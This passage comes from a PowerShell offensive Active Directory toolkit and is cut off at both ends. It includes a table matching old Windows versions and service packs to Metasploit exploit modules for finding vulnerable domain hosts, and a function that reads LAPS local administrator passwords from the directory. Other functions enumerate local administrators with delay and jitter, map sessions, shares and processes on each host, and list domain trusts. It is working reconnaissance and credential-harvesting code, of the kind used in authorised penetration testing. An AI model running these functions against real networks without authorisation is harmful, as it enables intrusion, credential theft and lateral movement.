        $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Service Pack 2","exploit/windows/dcerpc/ms07_029_msdns_zonename","http://www.cvedetails.com/cve/2007-1748") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Service Pack 2","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2008","Service Pack 2","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2008","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2008","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2008","","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2008","","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2008 R2","","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","Server Pack 1","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","Server Pack 1","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","Server Pack 1","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","Service Pack 2","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/smb/ms05_039_pnp","http://www.cvedetails.com/cve/2005-1983") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms06_066_nwapi","http://www.cvedetails.com/cve/2006-4688") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms06_070_wkssvc","http://www.cvedetails.com/cve/2006-4691") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 3","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 3","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  

        # Status user        
        Write-Verbose "[*] Checking computers for vulnerable OS and SP levels..."

        # ----------------------------------------------------------------
        # Setup data table to store vulnerable systems
        # ----------------------------------------------------------------

        # Create data table to house vulnerable server list
        $TableVulnComputers = New-Object System.Data.DataTable 
        $TableVulnComputers.Columns.Add('ComputerName') | Out-Null
        $TableVulnComputers.Columns.Add('OperatingSystem') | Out-Null
        $TableVulnComputers.Columns.Add('ServicePack') | Out-Null
        $TableVulnComputers.Columns.Add('LastLogon') | Out-Null
        $TableVulnComputers.Columns.Add('MsfModule') | Out-Null  
        $TableVulnComputers.Columns.Add('CVE') | Out-Null   
        
        # Iterate through each exploit
        $TableExploits | 
        ForEach-Object {
                     
            $ExploitOS = $_.OperatingSystem
            $ExploitSP = $_.ServicePack
            $ExploitMsf = $_.MsfModule
            $ExploitCve = $_.CVE

            # Iterate through each ADS computer
            $TableAdsComputers | 
            ForEach-Object {
                
                $AdsHostname = $_.Hostname
                $AdsOS = $_.OperatingSystem
                $AdsSP = $_.ServicePack                                                        
                $AdsLast = $_.LastLogon
                
                # Add exploitable systems to vul computers data table
                if ($AdsOS -like "$ExploitOS*" -and $AdsSP -like "$ExploitSP" ){                    
                    # Add domain computer to data table                    
                    $TableVulnComputers.Rows.Add($AdsHostname,$AdsOS,$AdsSP,[dateTime]::FromFileTime($AdsLast),$ExploitMsf,$ExploitCve) | Out-Null 
                }
            }
        }     
        
        # Display results
        $VulnComputer = $TableVulnComputers | select ComputerName -Unique | measure
        $vulnComputerCount = $VulnComputer.Count
        If ($VulnComputer.Count -gt 0){
            # Return vulnerable server list order with some hack date casting
            Write-Verbose "[+] Found $vulnComputerCount potentially vulnerabile systems!"
            $TableVulnComputers | Sort-Object { $_.lastlogon -as [datetime]} -Descending

        }else{
            Write-Verbose "[-] No vulnerable systems were found."
        }
    }
    End
    {
    }
}


function Get-LAPSPasswords
{
    <#
        .Synopsis
           This module will query Active Directory for the hostname, LAPS (local administrator) stored password, 
           and password expiration for each computer account.
        .DESCRIPTION
           This module will query Active Directory for the hostname, LAPS (local administrator) stored password, 
           and password expiration for each computer account. The script filters out disabled domain computers. 
           LAPS password storage can be identified by querying the (domain user available) ms-MCS-AdmPwdExpirationTime 
           attribute. If the attribute (timestamp) exists, LAPS is in use for local administrator passwords. Access to
           ms-MCS-AdmPwd attribute should be restricted to privileged accounts.  Also, since the script uses data tables 
           to output affected systems the results can be easily piped to other commands such as test-connection or a Export-Csv.
        .EXAMPLE
           The example below shows the standard command usage. Disabled system are excluded by default. If your user doesn't
           have the rights to read the password, then it will show 0 for Readable.
           PS C:\> Get-LAPSPasswords -DomainController 192.168.1.1 -Credential demo.com\administrator | Format-Table -AutoSize
           
           Hostname                    Stored Readable Password       Expiration         
           --------                    ------ -------- --------       ----------         
           WIN-M8V16OTGIIN.test.domain 0      0                       NA                 
           WIN-M8V16OTGIIN.test.domain 0      0                       NA                 
           ASSESS-WIN7-TES.test.domain 1      1        $sl+xbZz2&qtDr 6/3/2015 7:09:28 PM                  
        .EXAMPLE
           The example below shows how to write the output to a csv file.
           PS C:\> Get-LAPSPasswords -DomainController 192.168.1.1 -Credential demo.com\administrator | Export-Csv c:\temp\output.csv -NoTypeInformation
        .LINK
           http://www.netspi.com
           https://github.com/kfosaaen/Get-LAPSPasswords
           https://technet.microsoft.com/en-us/library/security/3062591
           
        .NOTES
           Author: Karl Fosaaen - 2015, NetSPI
           Version: Get-LAPSPasswords.psm1 v1.0
           Comments: The technique used to query LDAP was based on the "Get-AuditDSComputerAccount" 
           function found in Carlos Perez's PoshSec-Mod project.  The general idea is based off of  
           a Twitter conversation with @_wald0. The bones of this were borrowed (with permission) from 
           Scott Sutherland's Get-ExploitableSystems function.
    
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000.")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree",

        [Parameter(Mandatory=$false,
        HelpMessage="Distinguished Name Path to limit search to.")]

        [string]$SearchDN
    )
    Begin
    {
        if ($DomainController -and $Credential.GetNetworkCredential().Password)
        {
            $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }
        else
        {
            $objDomain = [ADSI]""  
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }
    }

    Process
    {
        # Status user
        Write-Verbose "[*] Grabbing computer accounts from Active Directory..."

        # Create data table for hostnames, and passwords from LDAP
        $TableAdsComputers = New-Object System.Data.DataTable 
        $TableAdsComputers.Columns.Add('Hostname') | Out-Null
        $TableAdsComputers.Columns.Add('Stored') | Out-Null
        $TableAdsComputers.Columns.Add('Readable') | Out-Null
        $TableAdsComputers.Columns.Add('Password') | Out-Null
        $TableAdsComputers.Columns.Add('Expiration') | Out-Null

        # ----------------------------------------------------------------
        # Grab computer account information from Active Directory via LDAP
        # ----------------------------------------------------------------
        $CompFilter = "(&(objectCategory=Computer))"
        $ObjSearcher.PageSize = $Limit
        $ObjSearcher.Filter = $CompFilter
        $ObjSearcher.SearchScope = "Subtree"

        if ($SearchDN)
        {
            $objSearcher.SearchDN = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($SearchDN)")
        }

        $ObjSearcher.FindAll() | ForEach-Object {

            # Setup fields
            $CurrentHost = $($_.properties['dnshostname'])
            $CurrentUac = $($_.properties['useraccountcontrol'])
            $CurrentPassword = $($_.properties['ms-MCS-AdmPwd'])
            if ($_.properties['ms-MCS-AdmPwdExpirationTime'] -ge 0){$CurrentExpiration = $([datetime]::FromFileTime([convert]::ToInt64($_.properties['ms-MCS-AdmPwdExpirationTime'],10)))}
            else{$CurrentExpiration = "NA"}
                        
            $PasswordAvailable = 0
            $PasswordStored = 1

            # Convert useraccountcontrol to binary so flags can be checked
            # http://support.microsoft.com/en-us/kb/305144
            # http://blogs.technet.com/b/askpfeplat/archive/2014/01/15/understanding-the-useraccountcontrol-attribute-in-active-directory.aspx
            $CurrentUacBin = [convert]::ToString($CurrentUac,2)

            # Check the 2nd to last value to determine if its disabled
            $DisableOffset = $CurrentUacBin.Length - 2
            $CurrentDisabled = $CurrentUacBin.Substring($DisableOffset,1)

            # Set flag if stored password is not available
            if ($CurrentExpiration -eq "NA"){$PasswordStored = 0}

            if ($CurrentPassword.length -ge 1){$PasswordAvailable = 1}

            # Add computer to list if it's enabled
            if ($CurrentDisabled  -eq 0){
                # Add domain computer to data table
                $TableAdsComputers.Rows.Add($CurrentHost,$PasswordStored,$PasswordAvailable,$CurrentPassword, $CurrentExpiration) | Out-Null
            }

            # Display results
            $TableAdsComputers | Sort-Object {$_.Hostname} -Descending
         }

    }
    End
    {
    }
}


function Invoke-EnumerateLocalAdmins {
    <#
        .SYNOPSIS
        Enumerates members of the local Administrators groups
        across all machines in the domain.

        Author: @harmj0y
        License: BSD 3-Clause

        .DESCRIPTION
        This function queries the domain for all active machines with
        Get-NetComputers, then for each server it queries the local
        Administrators with Get-NetLocalGroup.

        .PARAMETER Hosts
        Host array to enumerate, passable on the pipeline.

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER Delay
        Delay between enumerating hosts, defaults to 0.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Jitter
        Jitter for the host delay, defaults to +/- 0.3.

        .PARAMETER OutFile
        Output results to a specified csv output file.

        .PARAMETER Domain
        Domain to query for systems.

        .LINK
        http://blog.harmj0y.net/
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [string]
        $HostList,

        [string]
        $HostFilter,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [double]
        $Jitter = .3,

        [string]
        $OutFile,

        [string]
        $Domain
    )

    begin {

        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # get the target domain
        if($Domain){
            $targetDomain = $Domain
        }
        else{
            # use the local domain
            $targetDomain = $null
        }

        Write-Verbose "[*] Running Invoke-EnumerateLocalAdmins with delay of $Delay"
        if($targetDomain){
            Write-Verbose "[*] Domain: $targetDomain"
        }

        # random object for delay
        $randNo = New-Object System.Random

        # if we're using a host list, read the targets in and add them to the target list
        if($HostList){
            if (Test-Path -Path $HostList){
                $Hosts = Get-Content -Path $HostList
            }
            else{
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
                return
            }
        }
        elseif($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'"
            $Hosts = Get-NetComputers -Domain $targetDomain -HostName $HostFilter
        }

        # delete any existing output file if it already exists
        If ($OutFile -and (Test-Path -Path $OutFile)){ Remove-Item -Path $OutFile }

    }

    process{

        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $targetDomain for hosts..."
            $Hosts = Get-NetComputers -Domain $targetDomain
        }

        # randomize the host list
        $Hosts = Get-ShuffledArray $Hosts

        if(-not $NoPing){
            $Hosts = $Hosts | Invoke-Ping
        }

        $counter = 0

        foreach ($server in $Hosts){

            $counter = $counter + 1

            Write-Verbose "[*] Enumerating server $server ($counter of $($Hosts.count))"

            # sleep for our semi-randomized interval
            Start-Sleep -Seconds $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

            # grab the users for the local admins on this server
            $users = Get-NetLocalGroup -HostName $server
            if($users -and ($users.Length -ne 0)){
                # output the results to a csv if specified
                if($OutFile){
                    $users | export-csv -Append -notypeinformation -path $OutFile
                }
                else{
                    # otherwise return the user objects
                    $users
                }
            }
            else{
                Write-Verbose "[!] No users returned from $server"
            }
        }
    }
}


function Invoke-EnumerateLocalAdminsThreaded {
    <#
        .SYNOPSIS
        Enumerates members of the local Administrators groups
        across all machines in the domain. Uses multithreading to
        speed up enumeration.

        Author: @harmj0y
        License: BSD 3-Clause

        .DESCRIPTION
        This function queries the domain for all active machines with
        Get-NetComputers, then for each server it queries the local
        Administrators with Get-NetLocalGroup.

        .PARAMETER Hosts
        Host array to enumerate, passable on the pipeline.

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Domain
        Domain to query for systems.

        .PARAMETER OutFile
        Output results to a specified csv output file.

        .PARAMETER MaxThreads
        The maximum concurrent threads to execute.

        .LINK
        http://blog.harmj0y.net/
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [string]
        $HostList,

        [string]
        $HostFilter,

        [Switch]
        $NoPing,

        [string]
        $Domain,

        [string]
        $OutFile,

        [Int]
        $MaxThreads = 20
    )

    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # get the target domain
        if($Domain){
            $targetDomain = $Domain
        }
        else{
            # use the local domain
            $targetDomain = $null
        }

        Write-Verbose "[*] Running Invoke-EnumerateLocalAdminsThreaded with delay of $Delay"
        if($targetDomain){
            Write-Verbose "[*] Domain: $targetDomain"
        }

        # if we're using a host list, read the targets in and add them to the target list
        if($HostList){
            if (Test-Path -Path $HostList){
                $Hosts = Get-Content -Path $HostList
            }
            else{
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
                "[!] Input file '$HostList' doesn't exist!"
                return
            }
        }
        elseif($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'"
            $Hosts = Get-NetComputers -Domain $targetDomain -HostName $HostFilter
        }

        # script block that eunmerates a server
        # this is called by the multi-threading code later
        $EnumServerBlock = {
            param($Server, $Ping, $OutFile)

            # optionally check if the server is up first
            $up = $true
            if($Ping){
                $up = Test-Server -Server $Server
            }
            if($up){
                # grab the users for the local admins on this server
                $users = Get-NetLocalGroup -HostName $server
                if($users -and ($users.Length -ne 0)){
                    # output the results to a csv if specified
                    if($OutFile){
                        $users | export-csv -Append -notypeinformation -path $OutFile
                    }
                    else{
                        # otherwise return the user objects
                        $users
                    }
                }
                else{
                    Write-Verbose "[!] No users returned from $server"
                }
            }
        }

        # Adapted from:
        #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
        $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $sessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()

        # grab all the current variables for this runspace
        $MyVars = Get-Variable -Scope 1

        # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
        $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")

        # Add Variables from Parent Scope (current runspace) into the InitialSessionState
        ForEach($Var in $MyVars) {
            If($VorbiddenVars -notcontains $Var.Name) {
            $sessionstate.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
            }
        }

        # Add Functions from current runspace to the InitialSessionState
        ForEach($Function in (Get-ChildItem Function:)) {
            $sessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
        }

        # threading adapted from
        # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
        # Thanks Carlos!
        $counter = 0

        # create a pool of maxThread runspaces
        $pool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads, $sessionState, $host)
        $pool.Open()

        $jobs = @()
        $ps = @()
        $wait = @()

        $counter = 0
    }

    process {

        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $targetDomain for hosts..."
            $Hosts = Get-NetComputers -Domain $targetDomain
        }

        # randomize the host list
        $Hosts = Get-ShuffledArray $Hosts
        $HostCount = $Hosts.Count
        Write-Verbose "[*] Total number of hosts: $HostCount"

        foreach ($server in $Hosts){
            # make sure we get a server name
            if ($server -ne ''){
                Write-Verbose "[*] Enumerating server $server ($($counter+1) of $($Hosts.count))"

                While ($($pool.GetAvailableRunspaces()) -le 0) {
                    Start-Sleep -milliseconds 500
                }

                # create a "powershell pipeline runner"
                $ps += [powershell]::create()

                $ps[$counter].runspacepool = $pool

                # add the script block + arguments
                [void]$ps[$counter].AddScript($EnumServerBlock).AddParameter('Server', $server).AddParameter('Ping', -not $NoPing).AddParameter('OutFile', $OutFile)

                # start job
                $jobs += $ps[$counter].BeginInvoke();

                # store wait handles for WaitForAll call
                $wait += $jobs[$counter].AsyncWaitHandle
            }
            $counter = $counter + 1
        }
    }

    end {

        Write-Verbose "Waiting for scanning threads to finish..."

        $waitTimeout = Get-Date

        while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $waitTimeout).totalSeconds) -gt 60) {
                Start-Sleep -milliseconds 500
            }

        # end async call
        for ($y = 0; $y -lt $counter; $y++) {

            try {
                # complete async job
                $ps[$y].EndInvoke($jobs[$y])

            } catch {
                Write-Warning "error: $_"
            }
            finally {
                $ps[$y].Dispose()
            }
        }
        $pool.Dispose()
    }
}


function Invoke-HostEnum {
    <#
        .SYNOPSIS
        Runs all available enumeration methods on a given host.

        .DESCRIPTION
        This function runs all available functions on a given host,
        including querying AD for host information, finding active
        sessions on a host, logged on users, available shares, whether
        the current user has local admin access, the local groups,
        local administrators, and local services on the target.

        .PARAMETER HostName
        The hostname to enumerate.

        .EXAMPLE
        > Invoke-HostEnum WINDOWSXP
        Runs all enumeration methods on the WINDOWSXP host
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]
        $HostName
    )

    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }

    "[+] Invoke-HostEnum Report: $HostName"

    # Step 1: get any AD data associated with this server
    $adinfo = Get-NetComputers -Hostname "$HostName*" -FullData | Out-String
    "`n[+] AD query for: $HostName"
     $adinfo.Trim()

    # Step 2: get active sessions for this host and display what we find
    $sessions = Get-NetSessions -HostName $HostName
    if ($sessions -and ($sessions.Count -ne 0)){
        "`n[+] Active sessions for $HostName :"
    }
    foreach ($session in $sessions) {
        $username = $session.sesi10_username
        $cname = $session.sesi10_cname
        $activetime = $session.sesi10_time
        $idletime = $session.sesi10_idle_time
        # make sure we have a result
        if (($username -ne $null) -and ($username.trim() -ne '')){
            "[+] $HostName - Session - $username from $cname - Active: $activetime - Idle: $idletime"
        }
    }

    # Step 3: get any logged on users for this host and display what we find
    $users = Get-NetLoggedon -HostName $HostName
    if ($users -and ($users.Count -ne 0)){
        "`n[+] Users logged onto $HostName :"
    }
    foreach ($user in $users) {
        $username = $user.wkui1_username
        $domain = $user.wkui1_logon_domain

        if ($username -ne $null){
            # filter out $ machine accounts
            if ( !$username.EndsWith("$") ) {
                "[+] $HostName - Logged-on - $domain\\$username"
            }
        }
    }

    # step 4: see if we can get the last loggedon user by remote registry
    $lastUser = Get-LastLoggedOn -HostName $HostName
    if ($lastUser){
        "`n[+] Last user logged onto $HostName : $lastUser"
    }

    # Step 5: get the shares for this host and display what we find
    $shares = Get-NetShare -HostName $HostName
    if ($shares -and ($shares.Count -ne 0)){
        "`n[+] Shares on $HostName :"
    }
    foreach ($share in $shares) {
        if ($share -ne $null){
            $netname = $share.shi1_netname
            $remark = $share.shi1_remark
            $path = '\\'+$HostName+'\'+$netname

            if (($netname) -and ($netname.trim() -ne '')){

                "[+] $HostName - Share: $netname `t: $remark"
                try{
                    # check for read access to this share
                    $f=[IO.Directory]::GetFiles($path)
                    "[+] $HostName - Read Access - Share: $netname `t: $remark"
                }
                catch {}
            }
        }
    }

    # Step 6: Check if current user has local admin access
    $access = Invoke-CheckLocalAdminAccess -Hostname $HostName
    if ($access){
        "`n[+] Current user has local admin access to $HostName !"
    }

    # Step 7: Get all the local groups
    $localGroups = Get-NetLocalGroups -Hostname $HostName | Format-List | Out-String
    if ($localGroups -and $localGroups.Length -ne 0){
        "`n[+] Local groups for $HostName :"
        $localGroups.Trim()
    }
    else {
        "[!] Unable to retrieve localgroups for $HostName"
    }

    # Step 8: Get any local admins
    $localAdmins = Get-NetLocalGroup -Hostname $HostName | Format-List | Out-String
    if ($localAdmins -and $localAdmins.Length -ne 0){
        "`n[+] Local Administrators for $HostName :"
        $localAdmins.Trim()
    }
    else {
        "[!] Unable to retrieve local Administrators for $HostName"
    }

    # Step 9: Get any local services
    $localServices = Get-NetLocalServices -Hostname $HostName | Format-List | Out-String
    if ($localServices -and $localServices.Length -ne 0){
        "`n[+] Local services for $HostName :"
        $localServices.Trim()
    }
    else {
        "[!] Unable to retrieve local services for $HostName"
    }

    # Step 10: Enumerate running processes
    $processes = Get-NetProcesses -Hostname $HostName
    if ($processes){
        "`n[+] Processes for $HostName :"
        $processes | Format-Table -AutoSize
    }
    else {
        "[!] Unable to retrieve processes for $HostName"
    }
}


########################################################
#
# Domain trust functions below.
#
########################################################

function Get-NetDomainTrusts {
    <#
        .SYNOPSIS
        Return all domain trusts for the current domain or
        a specified domain.

        .PARAMETER Domain
        The domain whose trusts to enumerate. If not given,
        uses the current domain.

        .EXAMPLE
        > Get-NetDomainTrusts
        Return domain trusts for the current domain.

        .EXAMPLE
        > Get-NetDomainTrusts -Domain "test"
        Return domain trusts for the "test" domain.
    #>

    [CmdletBinding()]
    param(
        [string]
        $Domain
    )

    $d = Get-NetDomain -Domain $Domain
    if($d){
        $d.GetAllTrustRelationships()
    }
}


function Get-NetDomainTrustsLDAP {
    <#
        .SYNOPSIS
        Return all domain trusts for the current domain or
        a specified domain using LDAP queries. This is potentially
        less accurate than the Get-NetDomainTrusts function, but
        can be relayed through your current domain controller
        in cases where you can't reach a remote domain directly.

        .PARAMETER Domain
        The domain whose trusts to enumerate. If not given,
        uses the current domain.

        .EXAMPLE
        > Get-NetDomainTrustsLDAP
        Return domain trusts for the current domain.

        .EXAMPLE
        > Get-NetDomainTrustsLDAP -Domain "test"
        Return domain trusts for the "test" domain.
    #>

    [CmdletBinding()]
    param(
        [string]
        $Domain
    )

    $TrustSearcher = $Null

    # if a domain is specified, try to grab that domain
    if ($Domain){

        # try to grab the primary DC for the current domain
        try{
            $PrimaryDC = ([Array](Get-NetDomainControllers))[0].Name
        }
        catch{
            $PrimaryDC = $Null
        }

        try {
            # reference - http://blogs.msdn.com/b/javaller/archive/2013/07/29/searching-across-active-directory-domains-in-powershell.aspx
            $dn = "DC=$($Domain.Replace('.', ',DC='))"

            # if we could grab the primary DC for the current domain, use that for the query
            if ($PrimaryDC){
                $TrustSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$PrimaryDC/$dn")
            }
            else{
                # otherwise default to connecting to the DC for the target domain
                $TrustSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn")
            }

            $TrustSearcher.filter = '(&(objectClass=trustedDomain))'
            $TrustSearcher.PageSize = 200
        }
        catch{
            Write-Warning "The specified domain $Domain does not exist, could not be contacted, or there isn't an existing trust."
            $TrustSearcher = $Null
        }
    }
    else{
        $Domain = (Get-NetDomain).Name
        $TrustSearcher = [adsisearcher]'(&(objectClass=trustedDomain))'
        $TrustSearcher.PageSize = 200
    }

    if($TrustSearcher){
        $TrustSearcher.FindAll() | ForEach-Object {
            $props = $_.Properties
            $out = New-Object psobject
            Switch ($props.trustattributes)
            {
                4  { $attrib = "External"}
                16 { $attrib = "CrossLink"}
                32 { $attrib = "ParentChild"}
                64 { $attrib = "External"}
                68 { $attrib = "ExternalQuarantined"}
                Default { $attrib = "unknown trust attribute number: $($props.trustattributes)" }
            }
            Switch ($props.trustdirection){
                0 {$direction = "Disabled"}
                1 {$direction = "Inbound"}
                2 {$direction = "Outbound"}
                3 {$direction = "Bidirectional"}
            }
            $out | Add-Member Noteproperty 'SourceName' $domain
            $out | Add-Member Noteproperty 'TargetName' $props.name[0]
            $out | Add-Member Noteproperty 'TrustType' "$attrib"
            $out | Add-Member Noteproperty 'TrustDirection' "$direction"
            $out
        }
    }
}


function Get-NetForestTrusts {
    <#
        .SYNOPSIS
        Return all trusts for the current forest.

        .PARAMETER Forest
